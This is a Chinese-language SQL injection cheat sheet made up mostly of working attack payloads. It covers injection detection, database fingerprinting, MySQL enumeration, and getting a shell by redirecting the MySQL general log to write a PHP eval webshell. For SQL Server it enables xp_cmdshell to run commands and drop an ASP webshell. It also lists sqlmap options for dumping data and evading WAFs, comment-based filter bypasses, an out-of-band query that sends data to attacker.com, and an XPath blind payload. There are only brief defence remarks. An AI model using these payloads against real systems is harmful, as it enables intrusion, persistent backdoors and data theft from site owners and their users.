## 判断是否有注入
`11'+//AND+//(//SELECT//+2868+//FROM//+(//SELECT//(SLEEP(2)))pcFy)+//AND//+'`

`%0dunion%0aselect%0auser`

## 初步判断数据库类型
`'and user>0`

如果有报错为：在将nvarchar值'dbo'转换成数据类型int时失败，则数据库为sqlserver数据库，不是mysql

## 判断数据库系统
`'and (select count(*) from sysobjects)>0  正常则是Mysql`

`'and (select count(*) from msysobjects)>0 正常则是SqlServer`

+ **;**	Oracle中不支持多行查询，返回错误，很可能是Oracle数据库
+ **#**	是MySQL中的注释符，返回错误说明该注入点可能不是MySQL
+ **–** 和**/**/**是Oracle，SQL server和MSSQL支持的注释符，如果正常，说明可能就是这仨了

## Mysql数据库
### 常用sql语句和函数
#### 查库
`select group_concat(shcema_name) from information_schema.schemata`

#### 查表
`select group_concat(table_name) from information_schema.tables where table_schema=库名`

#### 查列
`select group_concat(column_name) from information_schema.columns where table_name='表明'`

#### 查值
`select group_concat(列名1,';',列名2) from (select * from 库名.表名 limit 0,10) as a`

### GetShell
#### 查看数据库路径
`show variables like '%datadir%'` 通过显示数据库所在的路径来猜测web路径

#### 查看是否开启日志
`show variables like '%general%'`

#### 开启日志
`set global general_log = "ON";`

#### 设置日志路径
`set global general_log_file ='<网站根目录>/config.php';`

#### 写入webshell
`select "<?php @eval($_POST[abc]);?>";`

#### 连接getshell
`https://<web路径>/config.php`

## Sql Server数据库
### 判断是否为sa权限
`;if(1=(select is_srvrolemember('sysadmin'))) WAITFOR DELAY '0:0:5';--`

### 查看是否开启了xp_cmdshell
`;if(1=(select count(*) from master.dbo.sysobjects where xtype = 'x' and name = 'xp_cmdshell')) WAITFOR DELAY '0:0:5'--`

### 开启xp_cmdshell(SA权限用户)
`;EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;`

### 执行cmd命令
`;EXEC master..xp_cmdshell 'cmd命令';--`

### 查看是否开启成功（是否出网）
`;EXEC%20master..xp_cmdshell 'ping aa.dnslog';--`

### 写入webshell
`;EXEC%20master..xp_cmdshell 'echo ^<%eval request(chr(35))%^> > C:/inetpub/xxxxxx/a.asp';--`

## sqlmap语法
demo：`sqlmap -r 1.txt --random-agent --tamper=space2comment --level 4 --risk 3 --technique=T --dbms=mysql -p uname --dbs`

+ --random-agent：header头中的agent随机伪造，默认agent是有特征的会被waf拦截
+ --technique：指定探测技术，B 布尔盲注；T 时间盲注；E 报错注入；U 联合查询
+ --batch：自动选择过程中的询问请求
+ --tamper=space2comment：使用脚本绕过waf或过滤，默认脚本放在tamper目录下
+ --level：测试深度，等级1-5。使用5级会使用更多的payload
+ --risk：语句复杂度，等级越高越复杂，一般用3
+ --force-ssl：使用https服务，需要改端口后面加端口
+ --dbms：指定数据库类型
+ --cookie：指定cookie值
+ --is-dba：检测数据库权限。如果DBA是True可以尝试直接拿shell
+ -p：指定测试参数
+ -D：指定数据库名
+ -T：指定表名
+ -C：指定字段名
+ --dbs：获取所有数据库名
+ --userss：获取用户名
+ --tables：获取所有表名
+ --colums：获取字段名
+ --dump：下载当前数据库的所有数据
+ **<font style="color:rgb(68, 68, 68);">--file-read：读取文件</font>**
+ --purge ：清理缓存

## 利用SQL注释与空白符绕过基于正则的SQL注入规则
```sql
SELECT/*!88888cas*/t(1)FROM/**/users WHERE 1=1 UNION%a0SELECT version()
```

**<font style="color:rgb(51, 51, 51);">原理</font>**<font style="color:rgb(63, 63, 63);">：利用SQL注释与空白符干扰词法分析  
</font>**<font style="color:rgb(51, 51, 51);">突破点</font>**<font style="color:rgb(63, 63, 63);">：绕过基于正则的SQL注入规则  
</font>**<font style="color:rgb(51, 51, 51);">防御</font>**<font style="color:rgb(63, 63, 63);">：启用SQL语义分析引擎</font>

## OOB外带数据通道
```sql
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.attacker.com\\test'))
```

**<font style="color:rgb(51, 51, 51);">检测突破</font>**<font style="color:rgb(63, 63, 63);">：基于时间的盲注检测失效  
</font>**<font style="color:rgb(51, 51, 51);">防御</font>**<font style="color:rgb(63, 63, 63);">：限制出站DNS请求</font>

## <font style="color:rgb(51, 51, 51);">XPath盲注载荷生成</font>
```sql
' or count(/*)=1 or 'a'='b
```

**<font style="color:rgb(51, 51, 51);">原理</font>**<font style="color:rgb(63, 63, 63);">：通过节点数量判断结构信息  
</font>**<font style="color:rgb(51, 51, 51);">检测方案</font>**<font style="color:rgb(63, 63, 63);">：XPath查询参数化</font>

